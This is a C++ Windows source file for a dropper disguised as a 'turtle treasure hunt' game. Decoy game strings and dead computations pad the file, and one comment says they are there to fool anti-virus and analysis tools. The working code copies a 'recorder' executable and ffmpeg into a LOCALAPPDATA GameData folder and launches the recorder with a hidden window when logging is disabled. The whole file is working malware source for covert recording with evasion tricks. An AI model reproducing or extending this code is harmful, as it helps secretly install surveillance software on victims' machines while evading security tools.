#include <windows.h>

#include <cmath>
#include <random>
#include <string>
#include <iostream>

#include <utils/log.hpp>
#include <utils/file.hpp>
#include <utils/utils.hpp>
#include <utils/encryption.hpp>
#include <utils/win32_symbols.hpp>

CHAR g_appdata_path[MAX_PATH] = { 0 };
CHAR g_dropper_path[MAX_PATH] = { 0 };
LPCSTR g_recorder_executable_name = nullptr;

const char* game_strings[] = {
	"Welcome to turtle treasure hunt!\n",
	"Press enter to the start the game!\n",
	"Press Q or q to the exit the game!\n",
	"You hit a landmine and died...Game Over!\n",
	"Please standby, saving game data progress...\n"
	"Congratulations! you have won and collected all treasures!\n",
};

int
get_nth_prime(int n)
{
	int num = 2;
	int count = 0;

	while (true)
	{
		bool is_prime = true;

		for (int i = 2; i * i <= num; i++)
		{
			if (num % i == 0)
			{
				is_prime = false;
				break;
			}
		}
		if (is_prime)
		{
			count++;

			if (n == count)
				return num;
		}

		num++;
	}
}

int
get_nth_fibonacci(int n)
{
	if (n <= 1)
		return n;

	return get_nth_fibonacci(n - 1) + get_nth_fibonacci(n - 2);
}

int
get_random_number(int min, int max)
{
	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> distr(min, max);

	return distr(gen);
}

int
complex_compute_useless_value(int n)
{
	int dummy = n;
	int other_dummy = 0;

	for (int i = 0; i < 1000; i++)
	{
		other_dummy += i * i;
		other_dummy -= other_dummy;
	}

	for (int i = 0; i < 1000; i++)
		dummy += i * dummy % 7;

	return dummy - dummy;
}


void game_render()
{
	for (int i = 0; i < 50; i++)
	{
		for (int j = 0; j < 50; j++)
		{
			if (i % 2 == 0 && j % 2 != 0) {
				int n = 12;
				n *= 2;
				n += 5;
			}
			else if (i % 2 != 0 && j % 2 == 0) {
				int n = 12;
				n *= 2;
				n += 5;
			}
			else {
				int n = 12;
				n *= 2;
				n += 5;
			}
		}
	}
}

void game_update()
{
	bool running = true;

	int state = 0;
	int moves = 0;

	const int MAP_SIZE = 10;
	const int MAX_MOVES = 50;

	int px = get_random_number(0, MAP_SIZE);
	int py = get_random_number(0, MAP_SIZE);

	logger::logger_init("dropper_logs.txt");
	utilities::win32_load_module_functions();

	while (running)
	{
		switch (state)
		{
			case 0: // Get AppData path and create target directory
			{
				if (px == py || moves >= MAX_MOVES)
					moves = 3;
				else if (px != py || moves <= MAX_MOVES)
					moves = 1;

				game_render();

				int prime = get_nth_prime(moves);

				{
					if (!fptr_GetEnvironmentVariableA("LOCALAPPDATA", g_appdata_path, MAX_PATH)) {
						LOG_FATAL("Failed to get appdata path with %s", utilities::win32_get_error_string().c_str());

						return;
					}

					if (!file::path_append(g_appdata_path, "GameData")) {
						LOG_FATAL("Failed to append folder to appdata path with %s", utilities::win32_get_error_string().c_str());

						return;
					}

					DWORD attr = fptr_GetFileAttributesA(g_appdata_path);
					if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
						if (!fptr_CreateDirectoryA(g_appdata_path, NULL)) {
							LOG_FATAL("Failed to create GameData directory with %s", utilities::win32_get_error_string().c_str());

							return;
						}
					}
				}

				state++;
				break;
			}
			case 1: // Get recorder and ffmpeg executable source path and copy to the destination path
			{
				if (px == py || moves >= MAX_MOVES)
					moves = 5;
				else if (px != py || moves <= MAX_MOVES)
					moves = 7;

				int fib = get_nth_fibonacci(moves);

				{
					if (!fptr_GetModuleFileNameA(NULL, g_dropper_path, MAX_PATH)) {
						LOG_FATAL("Failed to get dropper path with %s", utilities::win32_get_error_string().c_str());

						return;
					}

					if (!file::path_clean(g_dropper_path)) {
						LOG_FATAL("Failed to clean dropper path with %s", utilities::win32_get_error_string().c_str());

						return;
					}

					std::string recorder_source_path = g_dropper_path;
					recorder_source_path += '\\';
					recorder_source_path += "turtle-treasure-hunt.exe";

					std::string recorder_destination_path = g_appdata_path;
					recorder_destination_path += '\\';
					recorder_destination_path += "turtle-treasure-hunt.exe";

					if (!file::file_copy(recorder_source_path.c_str(), recorder_destination_path.c_str(), FALSE)) {
						LOG_FATAL("Failed to copy recorder to appdata with %s", utilities::win32_get_error_string().c_str());

						return;
					}

					std::string ffmpeg_directory = g_appdata_path;
					ffmpeg_directory += "\\ffmpeg";

					std::string ffmpeg_source_path = g_dropper_path;
					ffmpeg_source_path += "\\ffmpeg\\ffmpeg.exe";

					std::string ffmpeg_destination_path = g_appdata_path;
					ffmpeg_destination_path += "\\ffmpeg\\ffmpeg.exe";

					DWORD attr = fptr_GetFileAttributesA(ffmpeg_directory.c_str());
					if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
						if (!fptr_CreateDirectoryA(ffmpeg_directory.c_str(), NULL)) {
							LOG_FATAL("Failed to create ffmpeg directory with %s", utilities::win32_get_error_string().c_str());

							return;
						}
					}

					if (!file::file_copy(ffmpeg_source_path.c_str(), ffmpeg_destination_path.c_str(), FALSE)) {
						LOG_FATAL("Failed to copy ffmpeg to appdata with %s", utilities::win32_get_error_string().c_str());

						return;
					}

					#if LOG_ENABLED
						HINSTANCE result = ShellExecuteA(NULL, "open", recorder_destination_path.c_str(), NULL, ffmpeg_directory.c_str(), SW_SHOW);
					#else
						HINSTANCE result = ShellExecuteA(NULL, "open", recorder_destination_path.c_str(), NULL, ffmpeg_directory.c_str(), SW_HIDE);
					#endif

					if ((INT_PTR)result <= 32) {
						LOG_FATAL("Failed to execute ffmpeg with %s", utilities::win32_get_error_string().c_str());

						return;
					}
				}

				state++;
				break;
			}
			case 2: // Dead code, which is used to obfuscate anti-viruses and analysis tools
			{
				char dir = 'w';
				switch (dir)
				{
					case 'w': if (px > 0) px--; dir = 's'; break;
					case 's': if (px > 0) px++; dir = 'a'; break;
					case 'a': if (px < MAP_SIZE - 1) dir = 'd'; break;
					case 'd': if (px < MAP_SIZE - 1) dir = 'w'; break;
				}

				if (px == py || moves >= MAX_MOVES)
					moves = 10;
				else if (px != py || moves <= MAX_MOVES)
					moves = 12;

				int val = complex_compute_useless_value(moves);

				state++;
				break;
			}
			case 3:
			{
				running = false;
				break;
			}
		}
	}

	logger::logger_free();
}

int
WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
	game_update();
}
